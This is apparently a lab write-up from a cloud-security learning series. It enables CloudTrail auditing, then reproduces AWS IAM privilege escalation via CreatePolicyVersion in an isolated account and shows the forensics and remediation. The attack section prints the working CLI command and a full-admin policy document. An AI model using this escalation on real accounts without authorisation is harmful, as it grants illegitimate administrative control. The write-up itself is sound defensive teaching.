# Day 2 — CloudTrail Logging & IAM Privilege Escalation Simulation

`Difficulty: Intermediate` · `Focus Area: Detection Engineering, Offensive IAM Security`

---

## 🎯 Objective

Enable centralized, tamper-evident audit logging via AWS CloudTrail, then 
reproduce — in a fully isolated, controlled lab — one of the most 
frequently observed real-world AWS privilege escalation techniques, from 
attack execution through forensic analysis and remediation.

## 🧩 Environment

| | |
|---|---|
| **Platform** | AWS Free Tier |
| **Region** | us-east-1 |
| **Tooling** | AWS Management Console, AWS CLI v2, PowerShell |

 Problem Statement

IAM privilege escalation is a common post-exploitation technique in real 
AWS incidents: a principal holding a narrow, seemingly low-risk permission 
set can, under certain conditions, grant itself full administrative 
access. This lab reproduces the technique end-to-end to build practical 
detection and remediation capability.

  Implementation

 1. Audit Logging (CloudTrail)
 Enabled a multi-region trail with log file integrity validation
 Enabled Management Event logging for both Read and Write operations
 Verified log delivery to a dedicated S3 bucket

 2. Account Password Policy
  Enforced 14-character minimum length, full complexity requirements, 
  90-day expiration, and 5-generation reuse prevention account-wide

 3. Privilege Escalation Lab

Setup — Created a low-privilege IAM identity (`test-limited-user`) 
with a custom policy scoped to five actions:

iam:CreatePolicyVersion
iam:ListPolicies
iam:GetPolicy
iam:ListPolicyVersions
iam:ListAttachedUserPolicies

Baseline verification:
```bash
$ aws s3 ls --profile test-limited-user
An error occurred (AccessDenied) when calling the ListBuckets operation
```
 Confirms genuinely restricted access prior to escalation.

**Attack execution** — `iam:CreatePolicyVersion` permits a principal to 
create a new version of *any* policy, including one attached to itself. 
Since `VulnerableTestPolicy` was attached to `test-limited-user`, the user 
rewrote its own policy:

```bash
$ aws iam create-policy-version \
    --policy-arn arn:aws:iam::<ACCOUNT_ID>:policy/VulnerableTestPolicy \
    --policy-document file://admin-policy.json \
    --set-as-default \
    --profile test-limited-user
```

`admin-policy.json`:
```json
{
  "Version": "2012-10-17",
  "Statement": [
    { "Effect": "Allow", "Action": "*", "Resource": "*" }
  ]
}
```

Post-attack verification:
```bash
$ aws s3 ls --profile test-limited-user
2026-07-05  aws-cloudtrail-logs-<ACCOUNT_ID>-xxxxxxxx
```
 Full account access confirmed — a "read-only IAM" identity is now a 
de facto administrator.

 4. CloudTrail Forensic Analysis

Located the `CreatePolicyVersion` event in CloudTrail Event History and 
extracted the full event record:

```json
{
  "eventName": "CreatePolicyVersion",
  "eventTime": "2026-07-06T09:29:48Z",
  "userIdentity": {
    "type": "IAMUser",
    "userName": "test-limited-user",
    "arn": "arn:aws:iam::<ACCOUNT_ID>:user/test-limited-user"
  },
  "sourceIPAddress": "REDACTED",
  "userAgent": "aws-cli/2.35.15 ...",
  "requestParameters": {
    "policyArn": "arn:aws:iam::<ACCOUNT_ID>:policy/VulnerableTestPolicy",
    "policyDocument": "{\"Effect\":\"Allow\",\"Action\":\"*\",\"Resource\":\"*\"}",
    "setAsDefault": true
  },
  "responseElements": {
    "policyVersion": { "versionId": "v2", "isDefaultVersion": true }
  }
}
```

**Analyst read-through:** This single event record is sufficient for a 
full incident timeline — the identity responsible, the exact timestamp, 
the originating client/tooling, the precise policy content injected, and 
confirmation that the change was applied as the default version.

### 5. Remediation & Cleanup

| Step | Action |
|---|---|
| 1 | Detached `VulnerableTestPolicy` from `test-limited-user` |
| 2 | Deleted the user's access keys |
| 3 | Deleted the IAM user |
| 4 | Deleted all non-default policy versions, then the policy itself |
| 5 | Verified deletion via `NoSuchEntity` on follow-up lookups |

 Key Concepts Applied

IAM Privilege Escalation— A class of attack in which a principal 
exploits IAM management actions (`CreatePolicyVersion`, 
`AttachUserPolicy`, `PutUserPolicy`, among ~20 documented paths) to grant 
itself permissions beyond its intended scope.

Compounding Risk — None of the five granted permissions were 
individually alarming; the risk emerged from the *combination* of a 
policy-modifying action with a self-referencing policy attachment.

 Key Takeaway

Permissions capable of modifying IAM policy content — even when the 
 surrounding permission set looks narrowly scoped — should never be 
granted without a corresponding **Permissions Boundary**, which caps the 
maximum privilege a principal can grant itself regardless of which 
 policies it is able to edit.

🔗 References
 Rhino Security Labs — *AWS IAM Privilege Escalation Methods*
AWS Documentation — *IAM Permissions Boundaries*

---
*Previous: [← Day 1 — Account Hardening](./day-01-account-setup.md)*
